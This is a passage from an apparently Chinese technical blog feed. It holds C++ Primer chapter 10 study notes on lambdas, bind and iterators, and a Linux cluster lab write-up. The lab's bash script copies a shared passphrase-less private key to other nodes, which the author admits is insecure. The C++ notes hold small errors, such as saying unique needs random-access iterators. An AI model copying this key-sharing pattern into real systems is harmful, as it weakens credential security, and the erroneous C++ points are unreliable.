class="built_in">begin</span>(),</span><br><span class="line">          [] (<span class="type">int</span> i) &#123;<span class="keyword">if</span> (i &lt; <span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i;&#125;);</span><br><span class="line">          </span><br><span class="line"><span class="comment">// 正确: 使用了尾置返回类型</span></span><br><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">         [] (<span class="type">int</span> i) -&gt; <span class="type">int</span> &#123;<span class="keyword">if</span> (i &lt; <span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确: 只有一条return, 无需指定返回类型, 可根据条件运算符类型推断出</span></span><br><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">         [] (<span class="type">int</span> i) &#123;<span class="keyword">return</span> i &lt; <span class="number">0</span> ? <span class="number">-1</span> : i;&#125;);</span><br></pre></td></tr></table></figure></li></ul><h4 id="练习10-21">练习10.21</h4><p>Q：编写一个 <code>lambda</code>，捕获一个局部 <code>int</code> 变量，并递减变量值，直至它变为0。一旦变量变为0，再调用<code>lambda</code>应该不再递减变量。<code>lambda</code>应该返回一个<code>bool</code>值，指出捕获的变量是否为0。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// capture list 就算没有也不可省</span></span><br><span class="line"><span class="comment">// parameter list 可省</span></span><br><span class="line"><span class="comment">// return type 可省, 但是func body非只有一条return, 必须尾置指定</span></span><br><span class="line"><span class="keyword">auto</span> f = [&amp;i]() -&gt; <span class="type">bool</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    --i;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参数绑定">参数绑定</h3><ul><li><p><code>lambda</code>表达式更适合在一两个地方使用的简单操作；如果需要在很多地方使用相同的操作，或者一个操作需要很多语句才能完成，还是需要定义函数（参数绑定的背景）。</p></li><li><p>函数如何包装成一元谓词？使用参数绑定。</p></li><li><p>标准库<code>bind</code>函数：</p><ul><li><p>定义在头文件<code>functional</code>中，可以看做为一个通用的函数适配器。</p></li><li><p><code>auto newCallable = bind(callable, arg_list);</code></p></li><li><p>我们再调用<code>newCallable</code>的时候，<code>newCallable</code>会调用<code>callable</code>并传递给它<code>arg_list</code>中的参数。</p></li><li><p><code>_n</code>代表第n个位置的参数。定义在<code>placeholders</code>的命名空间中。<code>using std::placeholder::_1;</code></p></li><li><p><code>auto g = bind(f, a, b, _2, c, _1);</code>，调用<code>g(_1, _2)</code>实际上调用<code>f(a, b, _2, c, _1)</code> （从1而非0开始）</p></li><li><p><strong>非占位符的参数要使用引用传参，必须使用标准库<code>ref</code>函数或者<code>cref</code>函数，需要<code>#include &lt;functional&gt;</code></strong> 。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lambda version</span></span><br><span class="line">for_each(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(),</span><br><span class="line">        [&amp;os, c](<span class="type">const</span> string &amp;s) &#123; os &lt;&lt; s &lt;&lt; c; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bind version</span></span><br><span class="line"><span class="function">ostream &amp;<span class="title">print</span><span class="params">(ostream &amp;os, <span class="type">const</span> string &amp;s, <span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> os &lt;&lt; s &lt;&lt; c;</span><br><span class="line">&#125;</span><br><span class="line">for_each(words.<span class="built_in">begin</span>(), words.<span class="built_in">end</span>(), <span class="built_in">bind</span>(print, <span class="built_in">ref</span>(os), _1, <span class="string">&#x27; &#x27;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>bind1st和bind2nd类似bind，也是接受一个函数作为参数生成一个新的可调用对象，该对象调用给定函数，并将绑定的参数传递给它。但是分别只能绑定第一个或第二个参数，已被弃用（deprecated)。</p></blockquote></li></ul></li></ul><h2 id="再探迭代器">再探迭代器</h2><p>标准库在头文件iterator中还定义了额外几种迭代器。</p><ul><li>插入迭代器（insert iterator）</li><li>流迭代器（stream iterator）</li><li>反向迭代器（reverse iterator）</li><li>移动迭代器（move iterator）</li></ul><h3 id="插入迭代器">插入迭代器</h3><ul><li><p>插入器是一种迭代器适配器，接受一个容器，生成一个迭代器，能实现向给定容器添加元素。</p></li><li><p>三种类型：</p><ul><li><p><code>back_inserter</code>：创建一个使用<code>push_back</code>的迭代器。</p></li><li><p><code>front_inserter</code>创建一个使用<code>push_front</code>的迭代器。<br>只有在容器支持 push_front 的情况下，才可以使用 front_inserter。<br>当使用 front_inserter 时，元素总是插入到容器第一个元素之前。</p></li><li><p><code>inserter</code>创建一个使用<code>insert</code>的迭代器。接受第二个参数，即一个指向给定容器的迭代器，元素会被插到迭代器所指向的元素之前。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; lst = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">list&lt;<span class="type">int</span>&gt; lst2, lst3, lst4;</span><br><span class="line"><span class="comment">// 拷贝完成后, lst2包含4 3 2 1</span></span><br><span class="line"><span class="built_in">copy</span>(lst.<span class="built_in">cbegin</span>(), lst.<span class="built_in">cend</span>(), <span class="built_in">front_inserter</span>(lst2));</span><br><span class="line"><span class="comment">// 拷贝完成后, lst3包含1 2 3 4</span></span><br><span class="line"><span class="built_in">copy</span>(lst.<span class="built_in">cbegin</span>(), lst.<span class="built_in">cend</span>(), <span class="built_in">inserter</span>(lst3, lst3.<span class="built_in">begin</span>()))</span><br><span class="line"><span class="comment">// 拷贝完成后, lst4包含1 2 3 4</span></span><br><span class="line"><span class="built_in">copy</span>(lst.<span class="built_in">cbegin</span>(), lst.<span class="built_in">cend</span>(), <span class="built_in">back_inserter</span>(lst4)</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>插入迭代器操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>it=t</code></td><td>在<code>it</code>指定的当前位置插入值<code>t</code>。假定<code>c</code>是<code>it</code>绑定的容器，依赖于插入迭代器的不同种类，此赋值会分别调用<code>c.push_back(t)</code>、<code>c.push_front(t)</code>、<code>c.insert(t, p)</code>，其中<code>p</code>是传递给<code>inserter</code>的迭代器位置</td></tr><tr><td><code>*it, ++it, it++</code></td><td>这些操作虽然存在，但不会对<code>it</code>做任何事情，每个操作都返回<code>it</code></td></tr></tbody></table><h3 id="iostream迭代器（速读）">iostream迭代器（速读）</h3><ul><li>迭代器可与输入或输出流绑定在一起，用于迭代遍历所关联的 IO 流。</li><li>通过使用流迭代器，我们可以用泛型算法从流对象中读取数据以及向其写入数据。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// note1: </span></span><br><span class="line">*in_iter++;  <span class="comment">// 返回旧值，迭代器前进</span></span><br><span class="line"><span class="comment">// ++优先级与*同，但略高，但后置++返回的是旧值</span></span><br><span class="line"></span><br><span class="line"><span class="function">istream_iterator&lt;<span class="type">int</span>&gt; <span class="title">in_iter</span><span class="params">(cin)</span></span>;  <span class="comment">// 从cin读取int</span></span><br><span class="line">istream_iterator&lt;<span class="type">int</span>&gt; eof;  <span class="comment">// 默认初始化迭代器，可作为尾后值迭代器</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">vec</span><span class="params">(in_iter, eof)</span></span>;  <span class="comment">// 从迭代器范围构造vec</span></span><br></pre></td></tr></table></figure><p><strong>istream_iterator的操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>istream_iterator&lt;T&gt; in(is);</code></td><td><code>in</code>从输入流<code>is</code>读取类型为<code>T</code>的值</td></tr><tr><td><code>istream_iterator&lt;T&gt; end;</code></td><td>读取类型是<code>T</code>的值的<code>istream_iterator</code>迭代器，表示尾后位置</td></tr><tr><td><code>in1 == in2</code></td><td><code>in1</code>和<code>in2</code>必须读取相同类型。如果他们都是尾后迭代器，或绑定到相同的输入，则两者相等。</td></tr><tr><td><code>in1 != in2</code></td><td>类似上条</td></tr><tr><td><code>*in</code></td><td>返回从流中读取的值</td></tr><tr><td><code>in-&gt;mem</code></td><td>与<code>*(in).mem</code>含义相同</td></tr><tr><td><code>++in, in++</code></td><td>使用元素类型所定义的<code>&gt;&gt;</code>运算符从流中读取下一个值。前置版本返回一个指向递增后迭代器的引用，后置版本返回旧值。</td></tr></tbody></table><p><strong>ostream_iterator的操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>ostream_iterator&lt;T&gt; out(os);</code></td><td><code>out</code>将类型为<code>T</code>的值写到输出流<code>os</code>中</td></tr><tr><td><code>ostream_iterator&lt;T&gt; out(os, d);</code></td><td><code>out</code>将类型为<code>T</code>的值写到输出流<code>os</code>中，每个值后面都输出一个<code>d</code>。<code>d</code>指向一个空字符结尾的字符数组。</td></tr><tr><td><code>out = val</code></td><td>用<code>&lt;&lt;</code>运算符将<code>val</code>写入到<code>out</code>所绑定的<code>ostream</code>中。<code>val</code>的类型必须和<code>out</code>可写的类型兼容。</td></tr><tr><td><code>*out, ++out, out++</code></td><td>这些运算符是存在的，但不对<code>out</code>做任何事情。每个运算符都返回<code>out</code>。</td></tr></tbody></table><h4 id="练习10-30">练习10.30</h4><p>Q: 使用流迭代器、<code>sort</code> 和 <code>copy</code> 从标准输入读取一个整数序列，将其排序，并将结果写到标准输出。</p><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="function">istream_iterator&lt;<span class="type">int</span>&gt; <span class="title">int_it</span><span class="params">(cin)</span>, int_eof</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span>(int_it, int_eof, <span class="built_in">back_inserter</span>(v));  <span class="comment">// 尾后插入迭代器</span></span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">copy</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout,<span class="string">&quot; &quot;</span>));</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向迭代器">反向迭代器</h3><ul><li>反向迭代器就是在容器中从尾元素向首元素反向移动的迭代器。</li><li>对于反向迭代器，递增和递减的操作含义会颠倒。</li><li>实现向后遍历，配合<code>rbegin</code>和<code>rend</code>。<br>可以通过向 sort 传递一对反向迭代器来将 vector 整理为递减顺序。</li><li>当从一个普通迭代器初始化一个反向迭代器，或给一个反向迭代器复制时，结果迭代器和原迭代器指向的并非相同元素。</li></ul><h2 id="泛型算法结构">泛型算法结构</h2><p>任何算法最基本的特征是它要求其迭代器提供哪些操作。</p><h3 id="5类迭代器">5类迭代器</h3><p>除了输出迭代器外，一个高层类别的迭代器支持低层类别迭代器的所有操作。</p><p>C++标准指明了泛型和数值算法的每个迭代器参数的最小类别。比如replace需要一对迭代器，至少是前向迭代器（需要能对序列执行多遍扫描）。</p><table><thead><tr><th>迭代器类别</th><th>解释</th><th>支持的操作</th></tr></thead><tbody><tr><td>输入迭代器</td><td>只读，不写；单遍扫描，只能递增</td><td><code>==</code>,<code>!=</code>,<code>++</code>,<code>*</code>,<code>-&gt;</code></td></tr><tr><td>输出迭代器</td><td><strong>只写</strong>，不读；单遍扫描，只能递增</td><td><code>++</code>,<code>*</code></td></tr><tr><td>前向迭代器</td><td>可读写；多遍扫描，只能递增</td><td><code>==</code>,<code>!=</code>,<code>++</code>,<code>*</code>,<code>-&gt;</code></td></tr><tr><td>双向迭代器</td><td>可读写；多遍扫描，可递增递减</td><td><code>==</code>,<code>!=</code>,<code>++</code>,<code>--</code>,<code>*</code>,<code>-&gt;</code></td></tr><tr><td>随机访问迭代器</td><td>可读写，多遍扫描，支持全部迭代器运算</td><td><code>==</code>,<code>!=</code>,<code>&lt;</code>,<code>&lt;=</code>,<code>&gt;</code>,<code>&gt;=</code>,<code>++</code>,<code>--</code>,<code>+</code>,<code>+=</code>,<code>-</code>,<code>-=</code>,<code>*</code>,<code>-&gt;</code>,<code>iter[n]</code>==<code>*(iter[n])</code></td></tr></tbody></table><h4 id="练习10-40">练习10.40</h4><p>Q: 你认为 <code>copy</code> 要求哪类迭代器？<code>reverse</code> 和 <code>unique</code> 呢？</p><ul><li><code>copy</code> 需要两个<strong>输入迭代器</strong>，一个<strong>输出迭代器</strong></li><li><code>reverse</code> 需要<strong>双向迭代器</strong></li><li><code>unique</code>需要<strong>随机访问迭代器</strong></li></ul><h3 id="算法的形参模式">算法的形参模式</h3><ul><li><code>alg(beg, end, other args);</code></li><li><code>alg(beg, end, dest, other args);</code></li><li><code>alg(beg, end, beg2, other args);</code><br>向输出迭代器写入数据的算法都假定目标空间足够容纳写入的数据。</li><li><code>alg(beg, end, beg2, end2, other args);</code><br>接受第二个输入序列的算法通常使用第二个范围内的元素与第一个范围结合来进行一些运算。</li></ul><p>其中，<code>alg</code>是算法名称，<code>beg</code>和<code>end</code>表示算法所操作的输入范围。<code>dest</code>、<code>beg2</code>、<code>end2</code>都是迭代器参数，是否使用要依赖于执行的操作。</p><h3 id="算法命名规范">算法命名规范</h3><ul><li>一些算法使用重载形式传递一个谓词。<br>比如<code>unique(beg, end);</code> 和 <code>unique(beg, end, comp);</code></li><li>接受一个元素值的算法通常有一个<strong>不同名</strong>的版本：加<code>_if</code>，接受一个谓词代替元素值。<br>比如<code>unique(beg, end)</code>和<code>unique(beg, end, comp);</code></li><li>区分拷贝元素的版本和不拷贝的版本：拷贝版本通常加<code>_copy</code>。<br>比如<code>reverse_copy(beg, end, dest);</code></li><li>一些算法同时提供了<code>_copy</code>和<code>_if</code>版本，这些版本接受一个目标位置迭代器和一个谓词。</li></ul><h2 id="特定容器算法">特定容器算法</h2><ul><li>对于<code>list</code>和<code>forward_list</code>，优先使用成员函数版本的算法而不是通用算法。<ul><li>对于通用版本的sort，由于要求随机访问迭代器，因此不能使用。</li><li>其他算法的通用版本可以用，但是代价太高：需要交换序列中的元素。<br>链表可以通过改变元素间的链接而非真的交换它们的值来快速”快速“交换元素。</li></ul></li></ul><p><strong>list 和 forward_list 成员函数版本的算法</strong>：</p><ul><li>通用算法不能改变底层容器</li><li>链表特有版本与通用版本相似，但一个至关重要的区别是其会改变底层的容器。</li></ul><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>lst.merge(lst2)</code></td><td>将来自<code>lst2</code>的元素合并入<code>lst</code>，二者都必须是有序的，元素将从<code>lst2</code>中删除。使用&lt;运算符。</td></tr><tr><td><code>lst.merge(lst2, comp)</code></td><td>同上，给定比较操作。</td></tr><tr><td><code>lst.remove(val)</code></td><td>调用<code>erase</code>删除掉与给定值相等(==)的每个元素</td></tr><tr><td><code>lst.remove_if(pred)</code></td><td>调用<code>erase</code>删除掉令一元谓词为真的每个元素</td></tr><tr><td><code>lst.reverse()</code></td><td>反转<code>lst</code>中元素的顺序</td></tr><tr><td><code>lst.sort()</code></td><td>使用<code>&lt;</code>排序元素</td></tr><tr><td><code>lst.sort(comp)</code></td><td>使用给定比较操作排序元素</td></tr><tr><td><code>lst.unique()</code></td><td>调用<code>erase</code>删除同一个值的连续拷贝。使用<code>==</code>。</td></tr><tr><td><code>lst.unique(pred)</code></td><td>调用<code>erase</code>删除同一个值的连续拷贝。使用给定的二元谓词。</td></tr></tbody></table><ul><li>上面的操作都返回<code>void</code></li></ul><p><strong>list和forward_list的splice成员函数版本的参数</strong>：</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td><code>(p, lst2)</code></td><td><code>p</code>是一个指向<code>lst</code>中元素的迭代器，或者一个指向<code>flst</code>首前位置的迭代器。函数将<code>lst2</code>中的所有元素移动到<code>lst</code>中<code>p</code>之前的位置或是<code>flst</code>中<code>p</code>之后的位置。将元素从<code>lst2</code>中删除。<code>lst2</code>的类型必须和<code>lst</code>相同，而且不能是同一个链表。</td></tr><tr><td><code>(p, lst2, p2)</code></td><td>同上，<code>p2</code>是一个指向<code>lst2</code>中位置的有效的迭代器，将<code>p2</code>指向的元素移动到<code>lst</code>中，或将<code>p2</code>之后的元素移动到<code>flst</code>中。<code>lst2</code>可以是于<code>lst</code>或<code>flst</code>相同的链表。</td></tr><tr><td><code>(p, lst2, b, e)</code></td><td><code>b</code>和<code>e</code>表示<code>lst2</code>中的合法范围。将给定范围中的元素从<code>lst2</code>移动到<code>lst</code>或<code>first</code>中。<code>lst2</code>与<code>lst</code>可以使相同的链表，但<code>p</code>不能指向给定范围中的元素。</td></tr></tbody></table><ul><li>使用<code>lst.splice(args)</code>或<code>flst.splice_after(args)</code></li></ul><h4 id="练习10-42">练习10.42</h4><p>Q: 使用 <code>list</code> 代替 <code>vector</code> 重新实现10.2.3节中的去除重复单词的程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">elimDups</span><span class="params">(list&lt;string&gt; &amp;words)</span> </span>&#123;</span><br><span class="line">words.<span class="built_in">sort</span>();</span><br><span class="line">words.<span class="built_in">unique</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">list&lt;string&gt; l = &#123; <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;aasss&quot;</span>, <span class="string">&quot;aa&quot;</span> &#125;;</span><br><span class="line"><span class="built_in">elimDups</span>(l);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; e : l)</span><br><span class="line">std::cout &lt;&lt; e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lab1 Linux基础实验</title>
      <link href="/2023/10/25/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab1/"/>
      <url>/2023/10/25/%E5%88%86%E5%B8%83%E5%BC%8F-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%EF%BC%88B%EF%BC%89-lab1/</url>
      
        <content type="html"><![CDATA[<h1 id="任务7-多节点任务处理">任务7. 多节点任务处理</h1><p>为了充分利用集群的运算性能，我们需要将资源分配至各个节点、协调各个节点的任务、整合多个结果等等。接下来我们来控制命令在多个主机上协同运行。目前集群节点有thumm01, thumm03~thumm05。</p><h2 id="集群主机之间免密登录配置">集群主机之间免密登录配置</h2><p>请你用 linux shell 写一个脚本auto_autho.sh，实现各节点之间的免密登录。即实现thumm01分别到thumm03~thumm05的免密登录，使得运行该脚本后，可以通过ssh thumm0X从thumm01免密登录到X号节点。<br>思路：这个脚本做的事情是在thumm01上生成2个节点的公钥和私钥，然后把所有公钥加入到authorized_keys中，然后把各自的公钥私钥以及authorized_keys分发到各个节点。</p><h3 id="auto-autho-sh">auto_autho.sh</h3><p>方便进行后续实验，在实现thumm01免密登录thumm05和thumm06，同时实现thumm05到thumm06的免密登录。</p><p>本脚本在第一次运行时需要确认连接（在查看<code>ECDSA key fingerprint   </code>后输入&quot;yes&quot;）并输入口令，实验中服务器上没有安装expect，也没有权限安装，否则可以写成免交互脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">avaiable_servers=(<span class="string">&quot;thumm05&quot;</span> <span class="string">&quot;thumm06&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#============= 让thumm01能登录05和06=================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥对</span></span><br><span class="line">[ ! -f ~/.ssh/id_rsa.pub ] &amp;&amp; ssh-keygen -t rsa -P <span class="string">&#x27;&#x27;</span> -f  ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送公钥</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub <span class="variable">$username</span>@<span class="variable">$host</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ssh <span class="variable">$username</span>@<span class="variable">$host</span> <span class="string">&quot;echo thumm01免密登录 <span class="variable">$host</span> 登录成功&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= 让thumm05和06能登录01=================</span></span><br><span class="line"><span class="comment"># 在另一个文件夹中创建另一队不对称密钥, thumm01保存公钥, thumm05和06存私钥</span></span><br><span class="line">another_ssh_filedir=<span class="string">&quot;.ssh_extra&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$another_ssh_filedir</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$another_ssh_filedir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$another_ssh_filedir</span>/id_rsa.pub ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">ssh-keygen -t rsa -P <span class="string">&#x27;&#x27;</span> -f  <span class="variable">$another_ssh_filedir</span>/id_rsa</span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$another_ssh_filedir</span>/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">scp <span class="variable">$another_ssh_filedir</span>/id_rsa <span class="variable">$username</span>@<span class="variable">$host</span>:~/.ssh</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$&#123;avaiable_servers[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ssh <span class="variable">$username</span>@<span class="variable">$host</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">ssh <span class="variable">$username</span>@thumm01 &#x27;echo <span class="variable">$host</span>免密登录thummm01成功&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>公私钥这样发送非常不安全，简便起见，这里不考虑安全性了（</p><h3 id="执行">执行</h3><p>需要在thumm05、thumm06上登录thumm01，建立起认证（回答<code>yes</code>）后该脚本才能顺利执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx@thumm01:~$ bash auto_autho.sh </span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: <span class="string">&quot;/home/dsjxtjc/xxxxxxxxxx/.ssh/id_rsa.pub&quot;</span></span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to <span class="built_in">log</span> <span class="keyword">in</span> with the new key(s), to filter out any that are already installed</span><br><span class="line"></span><br><span class="line">/usr/bin/ssh-copy-id: WARNING: All keys were skipped because they already exist on the remote system.</span><br><span class="line">                (<span class="keyword">if</span> you think this is a mistake, you may want to use -f option)</span><br><span class="line"></span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: <span class="string">&quot;/home/dsjxtjc/xxxxxxxxxx/.ssh/id_rsa.pub&quot;</span></span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to <span class="built_in">log</span> <span class="keyword">in</span> with the new key(s), to filter out any that are already installed</span><br><span class="line"></span><br><span class="line">/usr/bin/ssh-copy-id: WARNING: All keys were skipped because they already exist on the remote system.</span><br><span class="line">                (<span class="keyword">if</span> you think this is a mistake, you may want to use -f option)</span><br><span class="line"></span><br><span class="line">thumm01免密登录 thumm05 登录成功</span><br><span class="line">thumm01免密登录 thumm06 登录成功</span><br><span class="line">id_rsa                                                                       100% 1675     1.6KB/s   00:00    </span><br><span class="line">id_rsa                                                                       100% 1675     1.6KB/s   00:00    </span><br><span class="line">thumm05免密登录thummm01成功</span><br><span class="line">thumm06免密登录thummm01成功</span><br><span class="line">xxxxxxxxxx@thumm01:~$ </span><br></pre></td></tr></table></figure><h2 id="多结点任务处理">多结点任务处理</h2><p>请仿照 wc_dataset.txt，制作2G左右的数据集（比如将 wc_dataset.txt 重复拼接）。在多主机运行一个简单的词频统计任务并汇总（即每个单词出现多少次），对比单机处理和多机处理的差异，可以包括任务执行结果、延迟等方面。</p><h3 id="随机生成数据集">随机生成数据集</h3><p>统计 wc_dataset.txt 中单词后再一个个随机生成的速度太慢，这里还是采用分块后随机选择分块拼凑更高效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 